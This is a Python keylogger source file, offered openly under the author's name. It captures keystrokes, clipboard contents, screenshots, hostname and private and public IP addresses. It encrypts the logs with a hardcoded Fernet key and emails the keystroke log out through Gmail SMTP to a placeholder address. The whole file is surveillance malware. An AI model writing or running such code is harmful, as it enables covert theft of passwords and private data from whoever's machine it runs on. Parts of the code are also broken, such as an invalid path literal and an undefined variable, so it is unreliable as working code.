# Subject: python_keylogger
# Author: Trivedi_Aarsh

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab

system_information = "systeminfo.txt"
keys_information = "key_log.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

system_information_e = "system_information_e"
key_log_e = "key_log_e"
clipboard_information_e = "clipboard_information_e"

key = "bz5zpBvY8R7DDIjcfsDtYCHMSJWV86UZvKeyWG7sT7g="

file_path = "C:\Users\Aarsh  Trivedi\OneDrive\Desktop\git\python_keylogger_github" # actual_path_to_folder_containing_all_these_files
extend = "\\"
file_merge = file_path + extend

# Computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        ipaddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except Exception:
            f.write("Couldn't get the Public IP Address (most likely max query)")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.platform() + " " + "\n")
        # f.write("System: " + platform.system() + " " + platform.platform() + "\n")
        # info = subprocess.check_output(powershell,
        #                                stdin=subprocess.DEVNULL,
        #                                stderr=subprocess.DEVNULL,
        #                                text=True,
        #                                shell=True)
        # if (int(info.strip(".")[2]) == 22000):
        #     return "Windows [Version 11.0.22000.194]"
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipaddress + "\n")
        f.write("\n\n\n\n")
computer_information()

# clipboard_information
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("clipboard Data : \n" + pasted_data + "\n\n")

        except:
            f.write("Clipboard cannot be copied")
copy_clipboard()

# Screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()

time_iteration = 15
number_of_iterations_end = 3
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", " ")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("enter") > 0:
                    f.write("\n")
                    f.close()

                elif k.find("key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
            screenshot()
            # send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

            copy_clipboard()

            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iteration

normal_files = [file_merge + keys_information, file_merge + system_information, file_merge + clipboard_information]
encrypted_files = [file_merge + keys_information_e, file_merge + system_information_e, file_merge + clipboard_information_e]

# encrypting_files
count = 0
for encrypting_files in normal_files:
    with open(normal_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(encrypted)

    count += 1
time.sleep(120)

# sending email
fromaddr = "sender's email"
password = "sender's password"
toaddr = "receiver's email"
def send_email(filename, attachment, toaddr):
   msg = MIMEMultipart()

   msg['From'] = fromaddr

   msg['To'] = toaddr

   msg['Subject'] = "log file"

   body = "see the attachments"

   msg.attach(MIMEText(body, 'plain'))

   filename = "key_log.txt"
   attachment = open(attachment, 'rb')

   p = MIMEBase('application', 'octet-stream')

   p.set_payload((attachment).read())

   encoders.encode_base64(p)

   p.add_header('Content-Disposition', "attachment; filename = %s" % filename)


   msg.attach(p)

   s = smtplib.SMTP('smtp.gmail.com', 587)

   s.starttls()
   s.login(fromaddr, password)

   text = msg.as_string()

   s.sendmail(fromaddr, toaddr, text)

   s.quit()
send_email(keys_information, file_path + extend + keys_information, toaddr)